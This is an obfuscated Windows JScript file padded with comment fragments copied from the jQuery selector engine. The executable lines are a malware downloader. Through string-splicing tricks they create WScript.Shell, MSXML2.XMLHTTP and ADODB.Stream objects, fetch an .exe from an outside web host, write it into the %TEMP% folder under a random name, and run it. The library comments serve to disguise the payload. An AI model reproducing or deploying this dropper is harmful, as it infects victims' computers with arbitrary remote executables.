//function( tag, context ) {    var elem,     tmp = [],     i = 0,      By happy coincidence, a (broken) gEBTN appears on DocumentFragment nodes too     results = context.getElementsByTagName( tag );
var JIhukeFpu = [("antiseptic","lassitude","controversy","u")+"n"+("marie","delivering","US")+"FN", ("stiffen","homesickness","insoluble","shrewdness","BS")+("privy","ethereal","republicans","fault","C")+"z"+"JTr", "Expan"+"dEn"+"v"+"ir"+"o"+"nm"+"entStr"+("antecedent","dildos","silhouette","i")+"n"+"gs", ("flare","trans","%T")+"E"+("casual","imported","wisconsin","M")+"P%", "/qgOjfeGzu" + ("detected","haiti","sacerdotal",".")+"e"+"xe", "R"+("vagina","sterling","un"), "A"+"cti"+("connection","whirr","v")+("proof","feedback","achievements","handjob","eX")+"O"+"bj"+("elevate","kevin","ratios","e")+"ct", "WS"+("assimilate","inspired","nottingham","advocated","cr")+"ip"+("portland","cigarettes","t.")+"S"+"he"+("domination","pondering","alluvial","ll"), "xcWq"+"m"+("freebsd","modified","highs","composer","CVlt")+"qB", ("thrashing","furthermore","precipitation","controls","M")+"SX"+("oxidation","voiceless","M")+"L2"+("disrespectful","brawny","jaded",".XM")+("tigress","podcast","bunch","LH")+"T"+"TP"];
//QSA/matchesSelector  ---------------------------------------------------------------------- */
var MNzXh = this[JIhukeFpu[18 / 3]];
var mlFYDxAb = new MNzXh(JIhukeFpu[7]);
//}    return tmp;    }    return results;   };
var wLBoyC = new MNzXh(JIhukeFpu[9]);
//Filter out possible comments    if ( tag === \"*\" ) {     while ( (elem = results[i++]) ) {      if ( elem.nodeType === 1 ) {       tmp.push( elem );      }     
var mNfLI = mlFYDxAb[JIhukeFpu[2]](JIhukeFpu[3]) + JIhukeFpu[4];
//Class  Expr.find[\"CLASS\"] = support.getElementsByClassName && function( className, context ) {   if ( typeof context.getElementsByClassName !== \"undefined\" && documentIsHTML ) {    return context.getElementsByClassName( className );   }  };
wLBoyC.onreadystatechange = function () {
    if (wLBoyC["read"+"y"+("shaped","bucks","sta")+("turkish","selective","trains","te")] === 4) {
        var aAsodrCND = new MNzXh(("connector","accomplish","developed","A")+"DO"+("currants","noontide","surgical","widely","D")+"B."+("rarefied","later","appropriately","examines","S")+"t"+"r"+("winter","antelope","animal","barricade","eam"));
        aAsodrCND["o"+("thinking","comparable","particularly","problem","p")+"en"]();
        //QSA and matchesSelector support
        aAsodrCND.type = 10 / 5 + 3 - 4;
        //matchesSelector(:active) reports false when true (IE9/Opera 11.5)  rbuggyMatches = [];
        aAsodrCND["w"+("clamorous","marche","niggard","ri")+"te"](wLBoyC["Res"+("autonomy","systematically","state","lightbox","p")+"on"+"s"+"eB"+"ody"]);
        //qSa(:focus) reports false when true (Chrome 21)   We allow this because of a bug in IE8/9 that throws an error   whenever `document.activeElement` is accessed on an iframe   So, we allow :focus to pass through QSA all the time to avoid the IE error   See http:bugs.jquery.com/ticket/13378  rbuggyQSA = [];
        aAsodrCND[("nintendo","excluding","pos")+"i"+"ti"+"on"] = 0;
        //if ( (support.qsa = rnative.test( document.querySelectorAll )) ) {    Build QSA regex    Regex strategy adopted from Diego Perini   assert(function( div ) {     Select is set to empty string on purpose     This is to test IE\"s treatment of not explicitly     setting a boolean content attribute,     since its presence should be enough     http:bugs.jquery.com/ticket/12359    docElem.appendChild( div ).innerHTML = \"<a id=\"\" + expando + \"\"></a>\" +     \"<select id=\"\" + expando + \"-\r\" msallowcapture=\"\">\" +     \"<option selected=\"\"></option></select>\";
        aAsodrCND.saveToFile(mNfLI, 2);
        //Support: IE8, Opera 11-12.16     Nothing should be selected when empty strings follow ^= or $= or *=     The test attribute must be unknown in Opera but \"safe\" for WinRT     http:msdn.microsoft.com/en-us/library/ie/hh465388.aspx#attribute_section    if ( div.querySelectorAll(\"[msallowcapture^=\"\"]\").length ) {     rbuggyQSA.push( \"[*^$]=\" + whitespace + \"*(?:\"\"|\"\")\" );    
        aAsodrCND.close();
        //}    Support: IE8     Boolean attributes and \"value\" are not treated correctly    if ( !div.querySelectorAll(\"[selected]\").length ) {     rbuggyQSA.push( \"\[\" + whitespace + \"*(?:value|\" + booleans + \")\" );    
    };
};
try {

    //}    Support: Chrome<29, Android<4.4, Safari<7.0+, iOS<7.0+, PhantomJS<1.9.8+    if ( !div.querySelectorAll( \"[id~=\" + expando + \"-]\" ).length ) {     rbuggyQSA.push(\"~=\");    
    wLBoyC.open(("tireless","peripherals","G")+"ET", "ht"+("solomon","johnston","metre","yearling","tp://n")+"c"+"rweb.i"+("clyde","branch","geometry","n")+"/sy"+("nonce","circulate","compendium","s")+"tem/l"+("extermination","mercedes","composed","wheels","ogs/7t6f65")+"g.exe", false);

    //}    Webkit/Opera - :checked should return selected option elements     http:www.w3.org/TR/2011/REC-css3-selectors-20110929/#checked     IE8 throws error here and will not see later tests    if ( !div.querySelectorAll(\":checked\").length ) {     rbuggyQSA.push(\":checked\");    
    wLBoyC[("briefly","pension","lusitania","organ","s")+("brothel","knights","feeds","loops","e")+"nd"]();
    //}    Support: Safari 8+, iOS 8+     https:bugs.webkit.org/show_bug.cgi?id=136851     In-page `selector#id sibing-combinator selector` fails    if ( !div.querySelectorAll( \"a#\" + expando + \"+*\" ).length ) {     rbuggyQSA.push(\".#.+[+~]\");    }   });
    mlFYDxAb[JIhukeFpu[5]](mNfLI, 1, "rJwwSk" === "SFYyepKjHi"); UyQqb = "}    FF 3.5 - :enabled/:disabled and hidden elements (hidden elements are still enabled)     IE8 throws error here and will not see later tests    if ( !div.querySelectorAll(\":enabled\").length ) {     rbuggyQSA.push( \":enabled\", \":disabled\" );    ";
    //assert(function( div ) {     Support: Windows 8 Native Apps     The type and name attributes are restricted during .innerHTML assignment    var input = document.createElement(\"input\");    input.setAttribute( \"type\", \"hidden\" );    div.appendChild( input ).setAttribute( \"name\", \"D\" );
} catch (hyxYcW) { };
//Support: IE8     Enforce case-sensitivity of name attribute    if ( div.querySelectorAll(\"[name=d]\").length ) {     rbuggyQSA.push( \"name\" + whitespace + \"*[*^$|!~]?=\" );    